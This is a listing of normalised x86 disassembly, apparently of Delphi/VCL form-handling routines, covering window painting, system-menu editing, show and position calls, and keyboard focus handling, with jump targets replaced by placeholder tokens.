mov dl 0x1
mov eax esi
call sub_45e510
mov eax esi
call sub_45e40c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4491ac
mov edx eax
mov eax esi
call sub_45e054
sub_45e4c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45d0d8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_443750
mov eax ebx
call sub_45d0d8
mov edx esi
call sub_45e4c0
sub_45e510
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_456944
mov edx esi
call sub_456928
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45e5b8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_448d84
push eax
call SendMessageA
sub_45e604
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45e5b8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45e634
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45e5b8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45e6a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41de50
xor eax eax
push ebp
push sub_45e74e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41e2b4
xor eax eax
push ebp
push sub_45e72b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e732
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41e2b4
retn
sub_45e75c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_45d0d8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45d10c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403540
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44804c
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45d158
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403540
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45e7fc
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_448d84
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45e684
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_448d84
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_446f14
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45e87a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d9fc
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45e8dc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4471d8
pop edi
pop esi
retn
sub_45e928
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448d84
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45ea24
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45d44c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45e928
pop ecx
sub_45ea58
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_443c6c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_448d84
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_442c10
pop esi
pop ebx
retn
sub_45eae8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_448d84
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_447fd8
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_456364
sub_45eb48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_447074
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_455d78
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45eb94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4565d8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45ebcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45ec67
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ec6e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_455cd8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_463a18
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43f660
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_463a18
jmp r-xdata
sub_45ec94
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403540
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45ecd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d1f0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45ed00
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45e4c0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43f438
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45ed58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_447ebc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4623cc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403540
sub_45ede4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_448d84
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_448d84
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45ee7c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448d84
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45e45c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403540
sub_45eed4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_4492b8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45ef00
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45e4c0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45ef1c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_455d08
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_455d08
sub_45ef5c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45ef94
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_4040e8
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45efc8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45f119
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f120
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45ef1c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43f3dc
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412edc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_442068
lea eax [ ebp - 0x1c ]
call sub_406ca4
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45ef1c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45ef5c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4636bc
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_463724
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_463724
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45ef94
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412edc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_442068
lea eax [ ebp - 0x1c ]
call sub_406ca4
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_463654
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45f128
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45f19c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45f1c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_447320
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d1d8
lea edx [ ebp - 0x14 ]
call sub_4609a0
push ebp
mov eax [ ebp - 0x4 ]
call sub_45d1d8
lea edx [ ebp - 0x24 ]
call sub_4609a0
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_45f19c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45d1d8
lea edx [ ebp - 0x24 ]
call sub_4609a0
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_45f19c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45f19c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45f19c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45f280
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403540
pop esi
pop ebx
retn
sub_45f2a4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403540
pop esi
pop ebx
retn
sub_45f2c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_448200
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_4492b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4492b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45f364
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f8ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_463b08
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45f8b1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8b8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
push ebp
push j_sub_4037e4#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45f41c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e510
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4462dc
jmp r-xdata
mov eax [ rw-data ]
call sub_460bfc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_448d84
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_460bf0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f98
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
call sub_45a07c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
